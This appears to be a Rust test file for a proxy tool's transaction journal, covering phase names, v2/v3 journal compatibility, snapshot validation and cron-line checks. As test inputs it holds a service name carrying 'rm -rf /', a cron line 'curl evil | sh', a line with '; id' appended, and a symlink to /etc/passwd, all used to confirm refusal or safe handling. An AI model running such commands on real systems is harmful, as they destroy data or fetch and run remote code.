use super::*;
use crate::apply::program_journal::{self, ProgramJournal};
use crate::apply::snapshot::{self, take, v2_fixed_targets, v2_node_allowlist_with};
use crate::apply::testing::{
    acme_deployment, acme_home, build_v2_layout, file, v2_journal_text, V2_STATE,
};
use crate::domain::fixtures::config;
use crate::domain::protocol::{Core, Protocol};
use crate::sys::fs::{sha256_hex, TempDir};
use std::os::unix::fs::{symlink, PermissionsExt};

const ALL: [Phase; 20] = Phase::KNOWN;

fn tmp() -> TempDir {
    TempDir::new("journal-test").unwrap()
}

fn v3_journal() -> Journal {
    let cfg = config(&[(Protocol::VlessReality, 443, Core::Xray)]);
    Journal::new(
        "添加协议",
        Some(cfg),
        vec![svc::XRAY.into(), svc::NETWORK.into()],
        vec![svc::XRAY.into(), svc::NETWORK.into(), "onebox-net".into()],
        CronSnapshot {
            available: true,
            lines: vec!["17 4 * * * x # onebox:renew".into()],
            anchors: Some(vec![2]),
        },
        Snapshot::default(),
    )
}

/// [`v3_journal`] with a real `renew` line for `paths` (what `validate`
/// requires of the journaled cron lines).
fn v3_journal_for(paths: &Paths) -> Journal {
    let Journal::V2(mut journal) = v3_journal() else {
        unreachable!()
    };
    journal.cron.lines = vec![renew_line(paths)];
    Journal::V2(journal)
}

fn renew_line(paths: &Paths) -> String {
    crate::host::cron::line(
        "17 4 * * *",
        paths,
        crate::host::init::InitSystem::Systemd,
        &["renew", "--cron"],
        &paths.log.join("renew.log"),
        &crate::host::cron::Tag::renew(),
    )
    .unwrap()
}

fn keys(path: &Path) -> Vec<String> {
    let doc: Value = serde_json::from_slice(&fs::read(path).unwrap()).unwrap();
    doc.as_object().unwrap().keys().cloned().collect()
}

#[test]
fn phase_names_are_the_v2_names() {
    let names = [
        "prepared",
        "prepare-state",
        "replace-cores",
        "prepare-cores",
        "prepare-certificates",
        "check-configurations",
        "stop-old-services",
        "commit-configurations",
        "configure-services",
        "apply-website",
        "apply-network",
        "start-cores",
        "publish-clients",
        "publish-subscription",
        "finalize",
        "committed",
        "rollback-stop",
        "rollback-files",
        "rollback-services",
        "rolled-back",
    ];
    for (phase, name) in ALL.into_iter().zip(names) {
        let json = serde_json::to_value(&phase).unwrap();
        assert_eq!(json, name, "{phase:?}");
        assert_eq!(phase.id(), name);
        let back: Phase = serde_json::from_value(json).unwrap();
        assert_eq!(back, phase);
        assert!(!phase.label().is_empty());
    }
    let finished: Vec<Phase> = ALL.into_iter().filter(|p| p.is_finished()).collect();
    assert_eq!(finished, [Phase::Committed, Phase::RolledBack]);
    let rollback: Vec<Phase> = ALL.into_iter().filter(|p| p.is_rollback()).collect();
    assert_eq!(rollback, Phase::ROLLBACK);
    assert_eq!(Phase::STAGES[..], ALL[1..15]);
    assert_eq!(Phase::CheckConfigurations.label(), "校验配置");
}

#[test]
fn unknown_phase_names_are_kept_and_rolled_back() {
    // A stage or rollback phase a newer version added.
    for name in [
        "apply-dns",
        "rollback-network",
        "x",
        &"a".repeat(PHASE_NAME_MAX),
    ] {
        let phase: Phase = serde_json::from_value(name.into()).unwrap();
        assert_eq!(phase, Phase::Other(name.to_owned()));
        assert_eq!(phase.id(), name);
        assert!(!phase.is_finished() && !phase.is_rollback());
        assert_eq!(phase.label(), "未知阶段");
        assert_eq!(serde_json::to_value(&phase).unwrap(), name);
    }
    // Names no version writes are corrupt journals.
    for bad in [
        "",
        "Exploded",
        "rollback stop",
        "a\u{1b}[2J",
        &"a".repeat(PHASE_NAME_MAX + 1),
    ] {
        let err = serde_json::from_value::<Phase>(bad.into()).unwrap_err();
        assert!(err.to_string().contains("事务阶段无效"), "{bad:?}: {err}");
    }
    assert!(serde_json::from_value::<Phase>(serde_json::json!(3)).is_err());
    // A whole journal in such a phase loads and keeps the name.
    let dir_ = tmp();
    let paths = Paths::isolated(dir_.path());
    let mut doc: Value = serde_json::from_str(&v2_journal_text(Path::new("/r"))).unwrap();
    doc["phase"] = "apply-dns".into();
    fs::create_dir_all(dir(&paths)).unwrap();
    file(
        &dir(&paths).join(JOURNAL_FILE),
        0o600,
        &serde_json::to_vec(&doc).unwrap(),
    );
    let journal = load(&paths).unwrap().unwrap();
    assert_eq!(*journal.phase(), Phase::Other("apply-dns".into()));
    assert_eq!(
        pending(&paths).unwrap().config.unwrap().phase.id(),
        "apply-dns"
    );
}

#[test]
fn reads_a_journal_written_by_v2() {
    let dir_ = tmp();
    let root = dir_.path();
    let paths = build_v2_layout(root);
    let journal = parse(v2_journal_text(root).as_bytes()).unwrap();
    let Journal::V1(v1) = &journal else {
        panic!("expected a version-1 journal");
    };
    assert_eq!(journal.version(), V2_VERSION);
    assert_eq!(*journal.phase(), Phase::PrepareCores);
    assert_eq!(journal.reason(), None);
    assert!(journal.active_services().is_empty());
    assert_eq!(
        journal.cron(),
        CronSnapshot {
            available: false,
            lines: vec![],
            anchors: None
        }
    );
    assert_eq!(journal.snapshot().entries.len(), 39);
    assert!(matches!(journal.old(), OldState::V2(_)));
    let values = journal.v2_values().unwrap().unwrap();
    assert_eq!(values["PORT_vless_reality"], "443");
    let original = crate::state::v2::v2_values_from_json(V2_STATE).unwrap();
    for (key, value) in &original {
        assert_eq!(values.get(key), Some(value), "{key}");
    }
    assert!(values.contains_key("__EXPECTED_STATE_HASH"));
    assert_eq!(journal.info().version, 1);
    assert!(v1.old_state.is_some());
    // Its snapshot is checked against v2's allowlist.
    assert_eq!(journal.allowlist(&paths), v2_node_allowlist(&paths));
    let mut targets = v2_fixed_targets(&paths);
    targets.push(acme_deployment(root));
    let allow = v2_node_allowlist_with(&paths, &[acme_home(root)]);
    fs::create_dir(dir(&paths)).unwrap();
    take(&targets, &files_dir(&paths), &allow).unwrap();
    let mut recorded = journal.snapshot().clone();
    let deployment = recorded
        .entries
        .iter_mut()
        .find(|e| e.target == acme_deployment(root))
        .unwrap();
    // The deployment file embeds the capture root, so its digest differs.
    deployment.sha256 = snapshot::digest_tree(&acme_deployment(root)).unwrap();
    snapshot::validate(&recorded, &files_dir(&paths), &allow).unwrap();
}

#[test]
fn a_v2_journal_keeps_its_shape_when_its_phase_changes() {
    let dir_ = tmp();
    let root = dir_.path();
    let paths = build_v2_layout(root);
    file(
        &dir(&paths).join(JOURNAL_FILE),
        0o600,
        v2_journal_text(root).as_bytes(),
    );
    let mut journal = load(&paths).unwrap().unwrap();
    journal.set_phase(&paths, Phase::RollbackStop).unwrap();
    assert_eq!(*journal.phase(), Phase::RollbackStop);
    let path = dir(&paths).join(JOURNAL_FILE);
    let mut expected: Value = serde_json::from_str(&v2_journal_text(root)).unwrap();
    expected["phase"] = "rollback-stop".into();
    let written: Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
    assert_eq!(written, expected);
    assert_eq!(
        keys(&path),
        [
            "active_services",
            "cron_available",
            "cron_lines",
            "enabled_services",
            "old_state",
            "phase",
            "snapshot",
            "version"
        ]
    );
    assert_eq!(
        fs::metadata(&path).unwrap().permissions().mode() & 0o777,
        0o600
    );
    assert_eq!(load(&paths).unwrap().unwrap(), journal);
}

#[test]
fn first_install_v2_journal_has_no_old_state() {
    let text = r#"{"version":1,"old_state":null,"active_services":["onebox-network","onebox-net"],
        "enabled_services":["onebox-hop"],"cron_lines":["@reboot x # onebox-rust:onebox-xray"],
        "cron_available":true,"phase":"prepared","snapshot":{"entries":[]}}"#;
    let journal = parse(text.as_bytes()).unwrap();
    assert_eq!(journal.old(), OldState::None);
    assert_eq!(journal.v2_values().unwrap(), None);
    assert_eq!(
        journal.cron().lines,
        ["@reboot x # onebox-rust:onebox-xray"]
    );
    assert!(journal.cron().available);
    assert_eq!(journal.enabled_services(), ["onebox-hop"]);
}

#[test]
fn v3_journal_round_trips_typed() {
    let dir_ = tmp();
    let paths = Paths::isolated(dir_.path());
    let mut journal = v3_journal();
    assert_eq!(*journal.phase(), Phase::Prepared);
    assert_eq!(journal.reason(), Some("添加协议"));
    assert!(matches!(journal.old(), OldState::Config(c) if c.inbounds.len() == 1));
    assert_eq!(journal.v2_values().unwrap(), None);
    assert_eq!(journal.allowlist(&paths), node_allowlist(&paths));
    // Staged first, then (after the rename) rewritten in place.
    let stage = paths.root.join(".transaction-new-0");
    write_in(&stage, &journal).unwrap();
    fs::rename(&stage, dir(&paths)).unwrap();
    assert_eq!(load(&paths).unwrap().unwrap(), journal);
    journal.set_phase(&paths, Phase::StartCores).unwrap();
    let loaded = load(&paths).unwrap().unwrap();
    assert_eq!(loaded, journal);
    assert_eq!(loaded.cron().anchors, Some(vec![2]));
    assert_eq!(
        keys(&dir(&paths).join(JOURNAL_FILE)),
        [
            "active_services",
            "cron",
            "enabled_services",
            "old_config",
            "phase",
            "reason",
            "snapshot",
            "version"
        ]
    );
    assert_eq!(
        loaded.info(),
        PhaseInfo {
            version: VERSION,
            phase: Phase::StartCores,
            reason: Some("添加协议".into())
        }
    );
}

#[test]
fn journals_naming_unknown_services_are_refused() {
    for (field, name) in [
        ("active_services", "onebox-frps"),
        ("enabled_services", "sshd"),
        ("active_services", "onebox-xray; rm -rf /"),
    ] {
        let mut doc = serde_json::to_value(match v3_journal() {
            Journal::V2(j) => j,
            Journal::V1(_) => unreachable!(),
        })
        .unwrap();
        doc[field] = serde_json::json!([name]);
        let err = parse(&serde_json::to_vec(&doc).unwrap()).unwrap_err();
        assert_eq!(err.to_string(), "事务日志含未知服务", "{name}");
    }
    // Every canonical and legacy name is accepted.
    let mut doc: Value = serde_json::from_str(&v2_journal_text(Path::new("/r"))).unwrap();
    let names: Vec<&str> = SERVICES
        .iter()
        .chain(&LEGACY_NETWORK_SERVICES)
        .copied()
        .collect();
    doc["active_services"] = serde_json::json!(names);
    doc["enabled_services"] = serde_json::json!(names);
    parse(&serde_json::to_vec(&doc).unwrap()).unwrap();
}

#[test]
fn malformed_journals_are_errors() {
    let unsupported = "不支持的事务日志版本";
    let cases = [
        (r#"{"version":0}"#, unsupported),
        (r#"{"version":3,"phase":"prepared"}"#, unsupported),
        (r#"{"phase":"prepared"}"#, unsupported),
        (r#"{"version":"1"}"#, unsupported),
        (r#"[1]"#, unsupported),
        (r#"{"version":1}"#, "事务日志无效"),
        ("not json", "事务日志无效"),
    ];
    for (text, prefix) in cases {
        let err = parse(text.as_bytes()).unwrap_err().to_string();
        assert!(err.starts_with(prefix), "{text}: {err}");
    }
    let mut doc: Value = serde_json::from_str(&v2_journal_text(Path::new("/r"))).unwrap();
    doc["phase"] = "Exploded!".into();
    let err = parse(&serde_json::to_vec(&doc).unwrap()).unwrap_err();
    assert!(err.to_string().starts_with("事务日志无效"), "{err}");
}

#[test]
fn load_distinguishes_absent_incomplete_and_oversized() {
    let dir_ = tmp();
    let paths = Paths::isolated(dir_.path());
    assert_eq!(load(&paths).unwrap(), None);
    fs::create_dir_all(dir(&paths)).unwrap();
    let err = load(&paths).unwrap_err().to_string();
    assert!(err.starts_with("事务日志不完整，未执行任何恢复"), "{err}");
    let path = dir(&paths).join(JOURNAL_FILE);
    fs::File::create(&path)
        .unwrap()
        .set_len(MAX_BYTES + 1)
        .unwrap();
    assert_eq!(load(&paths).unwrap_err().to_string(), "事务日志过大");
    fs::remove_file(&path).unwrap();
    symlink("/etc/passwd", &path).unwrap();
    let err = load(&paths).unwrap_err().to_string();
    assert!(err.starts_with("事务日志不完整"), "{err}");
    fs::remove_dir_all(dir(&paths)).unwrap();
    // A symlinked or non-directory journal path is refused.
    symlink(dir_.path(), dir(&paths)).unwrap();
    assert!(load(&paths)
        .unwrap_err()
        .to_string()
        .starts_with("事务目录无效"));
    fs::remove_file(dir(&paths)).unwrap();
    fs::write(dir(&paths), b"").unwrap();
    assert!(load(&paths)
        .unwrap_err()
        .to_string()
        .starts_with("事务目录无效"));
}

#[test]
fn pending_reports_both_journals_and_refuses_corrupt_ones() {
    let dir_ = tmp();
    let paths = Paths::isolated(dir_.path());
    let clean = pending(&paths).unwrap();
    assert_eq!(clean, Pending::default());
    assert!(!clean.any());
    clean.refuse().unwrap();
    // A node journal.
    fs::create_dir_all(dir(&paths)).unwrap();
    write(&paths, &v3_journal()).unwrap();
    let state = pending(&paths).unwrap();
    assert_eq!(
        state.config,
        Some(PhaseInfo {
            version: VERSION,
            phase: Phase::Prepared,
            reason: Some("添加协议".into())
        })
    );
    assert!(!state.program);
    assert_eq!(state.refuse().unwrap_err().to_string(), PENDING_MESSAGE);
    // A self-update journal.
    fs::remove_dir_all(dir(&paths)).unwrap();
    let journal = ProgramJournal::new(
        format!("{}{}", program_journal::WORK_PREFIX, "0".repeat(24)),
        None,
        sha256_hex(b"new"),
        None,
    );
    program_journal::write(&paths, &journal).unwrap();
    let state = pending(&paths).unwrap();
    assert_eq!(state.config, None);
    assert!(state.program && state.any());
    // Corrupt journals are errors, not "nothing pending".
    fs::write(program_journal::journal_path(&paths), b"{").unwrap();
    assert!(pending(&paths).is_err());
    fs::remove_file(program_journal::journal_path(&paths)).unwrap();
    fs::create_dir_all(dir(&paths)).unwrap();
    fs::write(dir(&paths).join(JOURNAL_FILE), b"{\"version\":9}").unwrap();
    assert_eq!(
        pending(&paths).unwrap_err().to_string(),
        "不支持的事务日志版本"
    );
}

#[test]
fn old_states_are_checked_by_shape_on_load_and_by_rules_on_validate() {
    let base: Value = serde_json::from_str(&v2_journal_text(Path::new("/r"))).unwrap();
    let cases = [
        (
            serde_json::json!({"values": {"PORT_vless_reality": 443}}),
            "v2 状态值必须为字符串: PORT_vless_reality",
        ),
        (
            serde_json::json!({"values": []}),
            "v2 state.json 的 values 必须是对象",
        ),
        (
            serde_json::json!(["values"]),
            "v2 state.json 必须是 JSON 对象",
        ),
        (serde_json::json!("x"), "v2 state.json 必须是 JSON 对象"),
    ];
    for (old, detail) in cases {
        let mut doc = base.clone();
        doc["old_state"] = old;
        let err = parse(&serde_json::to_vec(&doc).unwrap()).unwrap_err();
        assert_eq!(
            err.to_string(),
            format!("事务日志记录的旧配置无效: {detail}")
        );
    }
    // v2 accepted a state without `values` (serde default): so does v3.
    let mut doc = base.clone();
    doc["old_state"] = serde_json::json!({});
    parse(&serde_json::to_vec(&doc).unwrap()).unwrap();
    // A v3 journal whose old configuration fails this version's rules
    // still loads (a later version may have tightened them); validation
    // refuses it.
    let Journal::V2(mut v3) = v3_journal() else {
        unreachable!()
    };
    v3.old_config.as_mut().unwrap().node_name = String::new();
    let journal = parse(&serde_json::to_vec(&v3).unwrap()).unwrap();
    let err = journal.check_old_config().unwrap_err();
    assert!(
        err.to_string()
            .starts_with("事务日志记录的旧配置无效: 节点名称"),
        "{err}"
    );
}

#[test]
fn validate_checks_everything_a_rollback_needs_before_it_starts() {
    let dir_ = tmp();
    let root = dir_.path();
    let paths = build_v2_layout(root);
    fs::create_dir(dir(&paths)).unwrap();
    // A v2 journal whose snapshot of this layout is in files/.
    let allow = v2_node_allowlist_with(&paths, &[acme_home(root)]);
    let mut targets = v2_fixed_targets(&paths);
    targets.push(acme_deployment(root));
    let taken = take(&targets, &files_dir(&paths), &allow).unwrap();
    let mut doc: Value = serde_json::from_str(&v2_journal_text(root)).unwrap();
    doc["snapshot"] = serde_json::to_value(&taken).unwrap();
    let v2 = parse(&serde_json::to_vec(&doc).unwrap()).unwrap();
    v2.validate_with(&paths, &allow).unwrap();
    let no_home = v2_node_allowlist_with(&paths, &[]);
    assert_eq!(
        v2.validate_with(&paths, &no_home).unwrap_err().to_string(),
        "快照路径范围不合法"
    );
    fs::write(files_dir(&paths).join("item-0"), b"tampered").unwrap();
    assert_eq!(
        v2.validate_with(&paths, &allow).unwrap_err().to_string(),
        "快照文件缺失或校验失败: item-0"
    );
    // A v3 journal is validated against the node allowlist.
    fs::remove_dir_all(dir(&paths)).unwrap();
    fs::create_dir(dir(&paths)).unwrap();
    let node = snapshot::node_allowlist(&paths);
    let taken = take(&snapshot::node_targets(&paths), &files_dir(&paths), &node).unwrap();
    let Journal::V2(mut v3) = v3_journal_for(&paths) else {
        unreachable!()
    };
    v3.snapshot = taken;
    let journal = Journal::V2(v3.clone());
    journal.validate(&paths).unwrap();
    // An old configuration failing this version's rules fails validate,
    // while the files can still be restored.
    v3.old_config.as_mut().unwrap().inbounds.clear();
    let err = Journal::V2(v3.clone()).validate(&paths).unwrap_err();
    assert_eq!(
        err.to_string(),
        "事务日志记录的旧配置无效: 配置缺少协议列表"
    );
    Journal::V2(v3.clone()).validate_files(&paths).unwrap();
    let loaded = parse(&serde_json::to_vec(&v3).unwrap()).unwrap();
    assert_eq!(loaded, Journal::V2(v3.clone()));
    v3.old_config = None;
    v3.active_services.push("sshd".into());
    let err = Journal::V2(v3).validate(&paths).unwrap_err();
    assert_eq!(err.to_string(), "事务日志含未知服务");
}

/// A v2 journal of the fixture layout whose snapshot is in `files/`, with
/// the deployment's acme.sh home.
fn v2_journal_on_disk(root: &Path) -> (Paths, Value, Allowlist) {
    let paths = build_v2_layout(root);
    fs::create_dir(dir(&paths)).unwrap();
    let allow = v2_node_allowlist_with(&paths, &[acme_home(root)]);
    let mut targets = v2_fixed_targets(&paths);
    targets.push(acme_deployment(root));
    let taken = take(&targets, &files_dir(&paths), &allow).unwrap();
    let mut doc: Value = serde_json::from_str(&v2_journal_text(root)).unwrap();
    doc["snapshot"] = serde_json::to_value(&taken).unwrap();
    (paths, doc, allow)
}

#[test]
fn validate_refuses_only_cron_anchors_a_rollback_could_not_use() {
    let dir_ = tmp();
    let root = dir_.path();
    let (paths, base, allow) = v2_journal_on_disk(root);
    let exe = paths.executable.display().to_string();
    let v2_boot = |exe: &str| {
        format!(
            "@reboot env ONEBOX_DIR='{}' '{exe}' service onebox-xray start >/dev/null 2>&1 # onebox-rust:onebox-xray",
            paths.root.display()
        )
    };
    let v2_cert = format!(
        "17 4 * * * {exe} cert renew proxy --cron >/dev/null 2>&1 # onebox-native-cert-proxy"
    );
    // v2's own lines (and a retired job, which is only ever kept) pass.
    let mut doc = base.clone();
    doc["cron_available"] = true.into();
    doc["cron_lines"] = serde_json::json!([
        v2_boot(&exe),
        v2_cert,
        "0 0 * * * /x/tls/acme/acme.sh --cron".replace("/x", &paths.root.display().to_string())
    ]);
    parse(&serde_json::to_vec(&doc).unwrap())
        .unwrap()
        .validate_with(&paths, &allow)
        .unwrap();
    // Lines a rollback cannot reinstall (it only keeps them while the
    // crontab has them) do not make the journal unrecoverable: foreign
    // ones, FRP's, another executable's, edited or commented-out ones.
    for line in [
        "* * * * * curl evil | sh".to_owned(),
        renew_line(&paths).replace("# onebox:renew", "# onebox:frp-renew"),
        v2_boot("/opt/other/onebox"),
        format!("{v2_cert}; id"),
        v2_cert.replace(">/dev/null", ">>/var/log/x.log"),
        format!("#{v2_cert}"),
    ] {
        let mut doc = base.clone();
        doc["cron_available"] = true.into();
        doc["cron_lines"] = serde_json::json!([line]);
        let journal = parse(&serde_json::to_vec(&doc).unwrap()).unwrap();
        journal.validate_with(&paths, &allow).unwrap();
    }
    // A v3 journal with anchors that do not match its lines.
    let node = snapshot::node_allowlist(&paths);
    fs::remove_dir_all(dir(&paths)).unwrap();
    fs::create_dir(dir(&paths)).unwrap();
    let taken = take(&snapshot::node_targets(&paths), &files_dir(&paths), &node).unwrap();
    let Journal::V2(mut v3) = v3_journal_for(&paths) else {
        unreachable!()
    };
    v3.snapshot = taken;
    Journal::V2(v3.clone()).validate(&paths).unwrap();
    for anchors in [vec![], vec![0, 1]] {
        v3.cron.anchors = Some(anchors.clone());
        let err = Journal::V2(v3.clone()).validate(&paths).unwrap_err();
        assert_eq!(
            err.to_string(),
            "事务记录的 crontab 位置无效，拒绝恢复",
            "{anchors:?}"
        );
    }
    v3.cron.lines.push(renew_line(&paths));
    v3.cron.anchors = Some(vec![3, 1]);
    let err = Journal::V2(v3).validate(&paths).unwrap_err();
    assert_eq!(err.to_string(), "事务记录的 crontab 位置无效，拒绝恢复");
}

#[test]
fn a_v2_journal_with_a_custom_acme_home_validates_without_acme_home_set() {
    // The deployment lives under the fixture's non-default home and no
    // ACME_HOME is consulted (a boot `net-apply` runs without it): the
    // recorded path alone, under a recognisable acme.sh home, is accepted.
    let dir_ = tmp();
    let root = dir_.path();
    let (paths, doc, _) = v2_journal_on_disk(root);
    let journal = parse(&serde_json::to_vec(&doc).unwrap()).unwrap();
    assert_ne!(acme_home(root), Path::new(snapshot::DEFAULT_ACME_HOME));
    assert!(journal
        .snapshot()
        .entries
        .iter()
        .any(|e| e.target == acme_deployment(root)));
    journal.validate(&paths).unwrap();
    // Without anything that makes it an acme.sh home, it is refused.
    fs::remove_file(acme_home(root).join("account.conf")).unwrap();
    assert_eq!(
        journal.validate(&paths).unwrap_err().to_string(),
        "快照路径范围不合法"
    );
}
